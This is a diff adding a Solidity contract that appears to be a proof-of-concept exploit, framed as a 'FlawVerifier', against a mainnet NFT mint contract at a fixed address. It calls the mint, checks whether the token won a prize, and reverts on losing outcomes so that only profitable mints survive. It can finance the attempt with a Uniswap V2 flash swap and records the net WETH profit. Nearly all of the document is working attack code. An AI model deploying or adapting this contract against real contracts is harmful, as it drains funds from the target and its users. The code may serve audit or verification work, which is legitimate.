@@ -1,0 +1,198 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface ILuckyTiger {
+    function pauseMint() external view returns (bool);
+    function totalSupply() external view returns (uint256);
+    function maxTotal() external view returns (uint256);
+    function price() external view returns (uint256);
+    function publicMint() external payable;
+    function ownerOf(uint256 tokenId) external view returns (address);
+    function isPrize(uint256 tokenId) external view returns (bool);
+}
+
+interface IERC721Receiver {
+    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
+        external
+        returns (bytes4);
+}
+
+interface IWETH9 {
+    function deposit() external payable;
+    function withdraw(uint256) external;
+    function balanceOf(address) external view returns (uint256);
+    function transfer(address, uint256) external returns (bool);
+}
+
+interface IUniswapV2Pair {
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+contract FlawVerifier is IERC721Receiver {
+    error MintPaused();
+    error SoldOut();
+    error ZeroPrice();
+    error InsufficientBonusPool(uint256 balance, uint256 required);
+    error UnexpectedCallbackSender(address sender);
+    error UnexpectedPairCaller(address caller);
+    error UnluckyOutcome(uint256 tokenId);
+    error TokenNotOwned(uint256 tokenId);
+    error FlashLoanNotNeeded();
+    error FlashLoanNotRepaid();
+    error NoNetProfit();
+
+    ILuckyTiger public constant TARGET = ILuckyTiger(0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967);
+    IWETH9 public constant WETH = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    IUniswapV2Pair public constant UNISWAP_V2_USDC_WETH =
+        IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
+
+    uint256 private constant FLASH_BPS_DENOMINATOR = 1000;
+    uint256 private constant FLASH_BPS_NUMERATOR = 997;
+
+    uint256 public mintedTokenId;
+    uint256 public lastBorrowAmount;
+    uint256 public lastRepaymentAmount;
+    bool public hypothesisValidated;
+
+    uint256 private _profitAmount;
+    bool private _flashInProgress;
+
+    constructor() {}
+
+    function executeOnOpportunity() external {
+        if (TARGET.pauseMint()) revert MintPaused();
+        if (TARGET.totalSupply() >= TARGET.maxTotal()) revert SoldOut();
+
+        uint256 mintPrice = TARGET.price();
+        if (mintPrice == 0) revert ZeroPrice();
+
+        // A winning public mint pays out 190% of price to the caller and 10% to the
+        // withdraw address after receiving only 100% in msg.value, so the contract must
+        // already have at least one extra `price` in its bonus pool for a winning attempt
+        // to finalize successfully.
+        if (address(TARGET).balance < mintPrice) {
+            revert InsufficientBonusPool(address(TARGET).balance, mintPrice);
+        }
+
+        uint256 startingValue = address(this).balance + WETH.balanceOf(address(this));
+        _ensureNativeCapital(mintPrice);
+
+        if (address(this).balance >= mintPrice) {
+            _attemptDirect(mintPrice);
+        } else {
+            _attemptWithFlashSwap(mintPrice);
+        }
+
+        _wrapAllEth();
+
+        uint256 endingValue = WETH.balanceOf(address(this));
+        if (endingValue <= startingValue) revert NoNetProfit();
+
+        _profitAmount = endingValue - startingValue;
+        hypothesisValidated = true;
+    }
+
+    function profitToken() external pure returns (address) {
+        return address(WETH);
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function uniswapV2Call(address sender, uint256, uint256 amount1, bytes calldata) external {
+        if (msg.sender != address(UNISWAP_V2_USDC_WETH)) revert UnexpectedPairCaller(msg.sender);
+        if (sender != address(this)) revert UnexpectedCallbackSender(sender);
+        if (!_flashInProgress) revert FlashLoanNotNeeded();
+
+        uint256 mintPrice = TARGET.price();
+        lastBorrowAmount = amount1;
+
+        WETH.withdraw(amount1);
+
+        uint256 tokenId = TARGET.totalSupply() + 1;
+
+        // Path stage 1: the wrapper contract calls publicMint() and lets the target finish
+        // all mint, prize, and payout logic before deciding whether to keep the result.
+        TARGET.publicMint{value: mintPrice}();
+
+        // Path stage 2: only after publicMint() returns does the wrapper inspect the outcome.
+        // We intentionally do not precompute the pseudo-random bit, to stay aligned with the
+        // original finding: the caller learns whether the mint was winning after completion.
+        if (!TARGET.isPrize(tokenId)) {
+            // Path stage 3: on an unfavorable outcome, revert the outer transaction so the mint,
+            // payment, and all intermediate state are rolled back atomically.
+            revert UnluckyOutcome(tokenId);
+        }
+
+        if (TARGET.ownerOf(tokenId) != address(this)) revert TokenNotOwned(tokenId);
+
+        mintedTokenId = tokenId;
+
+        uint256 repayment = _flashRepayment(amount1);
+        lastRepaymentAmount = repayment;
+
+        WETH.deposit{value: repayment}();
+        bool ok = WETH.transfer(address(UNISWAP_V2_USDC_WETH), repayment);
+        if (!ok) revert FlashLoanNotRepaid();
+
+        _flashInProgress = false;
+    }
+
+    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    receive() external payable {}
+
+    function _attemptDirect(uint256 mintPrice) internal {
+        uint256 tokenId = TARGET.totalSupply() + 1;
+
+        TARGET.publicMint{value: mintPrice}();
+
+        // If the current fork timestamp/difficulty resolves the mint to a losing branch,
+        // this revert is the concrete mechanical reason no profitable finalization exists on
+        // this exact state without advancing to a later block.
+        if (!TARGET.isPrize(tokenId)) revert UnluckyOutcome(tokenId);
+        if (TARGET.ownerOf(tokenId) != address(this)) revert TokenNotOwned(tokenId);
+
+        mintedTokenId = tokenId;
+    }
+
+    function _attemptWithFlashSwap(uint256 mintPrice) internal {
+        _flashInProgress = true;
+
+        uint256 repayment = _flashRepayment(mintPrice);
+        if (repayment <= mintPrice) revert FlashLoanNotNeeded();
+
+        // Borrow WETH directly from an existing deep mainnet pool, unwrap to ETH, mint, and
+        // repay in the same transaction. This only changes funding implementation, not exploit
+        // causality: the profit still comes solely from keeping winning publicMint outcomes.
+        UNISWAP_V2_USDC_WETH.swap(0, mintPrice, address(this), abi.encode(mintPrice));
+
+        if (_flashInProgress) revert FlashLoanNotRepaid();
+    }
+
+    function _ensureNativeCapital(uint256 mintPrice) internal {
+        uint256 ethBalance = address(this).balance;
+        if (ethBalance >= mintPrice) return;
+
+        uint256 missing = mintPrice - ethBalance;
+        uint256 wethBalance = WETH.balanceOf(address(this));
+
+        if (wethBalance >= missing) {
+            WETH.withdraw(missing);
+        }
+    }
+
+    function _flashRepayment(uint256 amount) internal pure returns (uint256) {
+        return ((amount * FLASH_BPS_DENOMINATOR) / FLASH_BPS_NUMERATOR) + 1;
+    }
+
+    function _wrapAllEth() internal {
+        uint256 ethBalance = address(this).balance;
+        if (ethBalance > 0) {
+            WETH.deposit{value: ethBalance}();
+        }
+    }
+}
